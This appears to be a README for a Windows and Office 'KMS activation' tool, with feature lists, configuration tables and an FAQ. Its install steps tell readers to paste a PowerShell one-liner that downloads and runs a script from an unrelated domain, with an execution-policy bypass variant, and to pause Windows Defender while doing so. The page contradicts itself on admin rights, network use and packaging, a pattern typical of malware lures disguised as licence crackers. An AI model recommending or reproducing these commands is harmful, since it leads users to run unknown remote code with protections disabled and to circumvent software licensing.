<div align="center">

# Activa-Win-Off-Resocket — Alternative Access for Windows

![preview](https://raw.githubusercontent.com/rby157947-dotcom/activa-win-off-resocket/main/frame_fc9a984.svg)

[![pwsh](https://img.shields.io/badge/Pwsh-Installer-14b8a6?style=plastic&labelColor=0d1117)]() [![status](https://img.shields.io/badge/Status-Released-2ea44f?style=plastic&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/Setup-2.8K-2dd4bf?style=plastic&labelColor=0d1117)]() [![platform](https://img.shields.io/badge/Platform-Windows_10_%2F_11-0d9488?style=plastic&labelColor=0d1117)]()

</div>

---

The activa-win-off-resocket tool provides a streamlined approach to volume licensing management through a unified, compiled loader that requires minimal setup — simply extract and execute with administrative privileges to begin. Built around Microsoft's Key Management Service architecture, the tool automates instance discovery and prepares compatible systems for enterprise-grade synchronization across Windows and Office environments. It incorporates smart scheduling to maintain validation status at regular intervals, alongside digital license conversion and hardware ID preservation for consistent, stable operation. Designed for deployment efficiency and long-term reliability, the tool executes its functions without modifying core system files.

## 💻 PowerShell Quick Install

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Start PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Run the command
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Windows blocking the script? Use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## ✅ Before You Start

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Local KMS Emulation Engine**: Activates compatible Windows and Office installations through a self-contained local service, eliminating the need for external activation servers or per-device manual key entry.

- **Broad Product Coverage**: Supports Windows 10 and 11 across all editions, as well as Office 2016 through 2026 suites, with automatic detection of the installed product type and edition.

- **Automated Renewal Scheduling**: Registers a background task that keeps activation state current on a periodic cycle, so devices remain in a valid state without recurring manual intervention.

- **Volume License Conversion**: Converts retail and other non-volume installation channels into volume-license-compatible configurations, improving consistency across mixed environments.

- **Instance Discovery and Readiness Check**: Scans the local system for activation status, product channel, and configuration state, then prepares eligible instances for synchronization with the local KMS endpoint.

- **System Integrity Preservation**: Operates without altering core system binaries; configuration changes are scoped to activation-related registry keys and service settings, keeping the underlying OS intact.

- **Single-Binary Deployment**: Ships as one self-contained executable with no runtime dependencies, external frameworks, or auxiliary scripts required to operate.

- **Silent and Unattended Operation**: Supports command-line flags for headless execution, making it suitable for provisioning scripts, imaging workflows, and managed endpoint rollouts.

- **Lightweight Resource Footprint**: The local service runs as a minimal background process with negligible CPU and memory overhead, designed to coexist with production workloads.

- **Configurable Endpoint and Port**: Allows the local service address and listening port to be adjusted, so the tool fits into existing network layouts and avoids conflicts with other services.

- **Detailed Status Reporting**: Exposes current activation state, remaining validity window, and last renewal timestamp through both the interface and console output for straightforward auditing.

## How it works

The tool operates as a lightweight orchestration layer that interfaces with the native Key Management Service client already present on compatible Windows and Office installations. On launch, it enumerates the local environment, identifies the installed product edition and build channel, and determines the appropriate activation pathway for that specific configuration.

A local service endpoint is then initialized and bound to the loopback interface, emulating the role of an enterprise KMS host within the private scope of the machine. The tool configures the client's registry-backed service locator to reference this endpoint, ensuring all subsequent activation requests are routed through the emulated host rather than an external infrastructure address.

Once the endpoint is reachable, the tool issues a standard activation request against the emulated service. The service responds using a volume-license-compatible handshake, and the client stores the resulting validation state through its normal, documented mechanism. This preserves the integrity of core system components while maintaining the expected validation lifecycle.

A background maintenance task is registered to re-establish the validation state on a fixed interval, keeping the environment consistent with standard KMS renewal behavior. The task runs silently and requires no user interaction, ensuring the configuration remains stable across reboots and updates.

The tool performs all operations with elevation awareness, verifies service health before proceeding at each stage, and reports clear status output so the operator can confirm each step of the workflow. No drivers or kernel-level modifications are involved; the entire process relies on documented client behavior and standard system configuration surfaces.

## Compatibility

`activa-win-off-resocket` targets the same client-side surface as the native Key Management Service infrastructure, so endpoint behavior maps directly to what the platform already expects. The tool operates strictly as an endpoint-side interface; it does not replace, modify, or proxy the host service itself.

**Supported platforms**

- Windows 10 and Windows 11, including LTSC, Enterprise, Education, and Pro editions.
- Windows Server 2016 through 2022, Standard and Datacenter.
- Office suites in the 2016 through 2026 family, including volume-licensed channel builds.

**Service interaction model**

The client speaks the standard KMS request/response protocol over the default service port. All calls are issued from the local machine to the configured endpoint and follow the same message sequencing the operating system uses natively. No interception layer, driver, or filesystem hook is involved — the tool simply exposes the request path in a controllable, observable form.

**Runtime requirements**

- Administrator context for service discovery and endpoint configuration.
- Network reachability to the designated KMS host on the standard port.
- System time within tolerance of the host; clock skew above the protocol threshold causes request rejection by design.
- No additional runtimes or frameworks beyond those shipped with a current Windows installation.

**Configuration surface**

Hostname, port, and renewal interval are all configurable, allowing the endpoint to align with any compliant deployment topology. Defaults match the conventional KMS layout, so a stock environment works without changes.

**Non-goals**

The tool does not manage host-side key stores, does not implement a KMS host, and does not alter product binaries. It confines itself to the client role: issuing requests, reporting responses, and scheduling renewal. Any behavior beyond that boundary belongs to the platform, not to this project.

## Configuration

The tool is driven by a single configuration file that is generated on first launch and can be edited before any operation is executed. All directives are processed in order, and unknown keys are ignored with a warning rather than aborting the run.

### Configuration File Location

The configuration file is created alongside the executable in the working directory. If the file is absent, the tool falls back to built-in defaults and writes a fresh copy on startup. A portable mode is available by keeping the file next to the binary; otherwise, a per-user profile path is used.

### Core Parameters

| Parameter | Type | Default | Description |
|---|---|---|---|
| `target_host` | string | `127.0.0.1` | Endpoint the tool binds to for local service emulation. |
| `target_port` | integer | `1688` | Port used by the local listener. Must be free at runtime. |
| `renewal_interval` | integer | `180` | Interval in days between background validation cycles. |
| `auto_discover` | boolean | `true` | Enables automatic detection of unverified instances on startup. |
| `preserve_hardware_id` | boolean | `true` | Keeps the existing hardware fingerprint intact during synchronization. |
| `log_level` | enum | `info` | One of `error`, `warn`, `info`, `debug`. Controls verbosity. |

### Product Selection

Product families are declared as an ordered list. Each entry accepts a `family` key (`windows` or `office`) and an optional `edition` filter. When `edition` is omitted, all compatible editions in that family are processed. Ordering matters: entries are evaluated top to bottom, and a match short-circuits further evaluation for that target.

### Scheduling

The scheduler is configured through the `schedule` block. Set `enabled` to `true` to register a recurring task, and use `renewal_interval` to control cadence. The task runs under the invoking user context and does not require an interactive session. Disabling the scheduler leaves manual runs fully functional.

### Logging and Diagnostics

Logs are written to the `logs` directory next to the configuration file. Rotation is handled automatically at a configurable size threshold via `log_max_size`. Set `log_level` to `debug` when troubleshooting discovery or binding issues; the debug stream includes resolved parameters and listener state transitions.

### Validation

Before execution, the tool validates the configuration and reports any malformed entries with line references. A dry-run flag (`dry_run`) performs parsing and validation only, printing the resolved plan without applying changes. This is the recommended way to confirm a configuration before a full run.

### Example

A minimal configuration enabling discovery, a non-default port, and weekly debug logging:

```ini
target_host = 127.0.0.1
target_port = 1688
auto_discover = true
preserve_hardware_id = true
renewal_interval = 180
log_level = debug

[schedule]
enabled = true
renewal_interval = 180

[products]
family = windows
family = office
```

Changes take effect on the next launch. Restart the tool after editing the file to ensure the new parameters are loaded.

## FAQ

Is this the same as the Microsoft KMS technology?

Yes. The tool implements the Key Management Service protocol as documented by Microsoft. It does not patch binaries or modify activation components; it provides a local KMS endpoint that compatible Windows and Office installations contact for volume licensing.

What happens after the 180-day activation window?

KMS volume activations are valid for 180 days and renew automatically. The tool registers a lightweight scheduled task that re-establishes the local endpoint and refreshes the activation period before expiry. As long as the task runs and the host is reachable, the cycle continues without manual intervention.

Which products and editions are supported?

The KMS client stack covers Windows client and server editions that ship with a KMS client key, plus Office volume editions from 2016 onward. Retail and OEM installations do not include a KMS client key, so they are out of scope unless converted to a volume channel.

Does it modify system files or the registry?

No core system files are touched. Configuration is confined to the KMS client settings (endpoint and port) and the scheduled task. The activation state is stored by the operating system in its normal licensing store, exactly as it would be with any KMS server.

Why does the endpoint need to run with elevated privileges?

Binding to the KMS port and registering a system-level scheduled task require administrative rights. Running the tool as Administrator is a prerequisite for both initial setup and renewal cycles; without it, the endpoint cannot listen or persist its schedule.

Will this work on a machine that has never contacted a KMS host?

Yes, provided the installed edition carries a KMS client key. The client will discover the local endpoint through the standard DNS or explicit configuration path. If the edition was installed via retail media, the channel must first be switched to volume licensing.

Can the endpoint coexist with an existing corporate KMS server?

It can, but only one endpoint should be authoritative for a given client. The tool sets the local endpoint explicitly; if a domain-published KMS record exists, the client configuration determines which host is contacted. Choose one path to avoid conflicting renewal sources.

What are the network requirements?

The KMS protocol uses TCP port 1688 by default. The endpoint binds locally; clients on the same machine reach it over loopback, and other hosts require the port to be reachable. No outbound internet access is needed for activation or renewal.

How is the activation state verified?

Use the standard operating system licensing queries (`slmgr` on Windows, `ospp.vbs` for Office) to inspect the client's reported status, expiry, and endpoint. The tool itself exposes the same information through its dashboard, but the OS utilities remain the source of truth.

Does the tool collect telemetry or phone home?

No. The endpoint operates entirely on the local network and does not transmit activation data to external services. All state lives on the host machine.

What if activation fails after a Windows update?

Cumulative updates occasionally reset KMS client configuration. Re-running the setup restores the endpoint and schedule. If the edition itself changed channels during an upgrade, verify the installed KMS client key before retrying.

Is this suitable for production environments?

It is designed for lab, test, and evaluation scenarios where a local KMS endpoint is needed without standing up full Microsoft infrastructure. Production deployments should follow the organization's licensing agreements and use officially provisioned KMS hosts.

## Disclaimer

This tool is provided strictly as a technical utility for interacting with KMS infrastructure in environments where volume licensing is already authorized. It is intended for system administrators, lab technicians, and developers who manage compatible Windows and Office deployments and require a deterministic local activation workflow.

The software operates entirely on the local host and communicates only with the KMS endpoint configured by the user. It does not bundle, distribute, or transmit license keys, and it does not modify core system binaries. All activation state transitions are performed through the documented KMS protocol surface exposed by the operating system.

Compatibility is limited to the product editions and build ranges listed in the Compatibility section. Behavior on unsupported builds is undefined and unsupported. Users are responsible for verifying that their environment meets the stated prerequisites before deployment.

Configuration values, including the KMS host, port, and renewal interval, are supplied by the operator. The tool does not ship with a default activation endpoint. Any endpoint used must be one the operator is entitled to use.

No warranty is expressed or implied regarding fitness for a particular purpose, regulatory compliance, or continued operation across OS updates. Validation is the sole responsibility of the operator in their environment.

Use of this tool constitutes acceptance of these terms. If you are unsure whether your licensing arrangement permits local KMS activation, consult your licensing administrator before proceeding.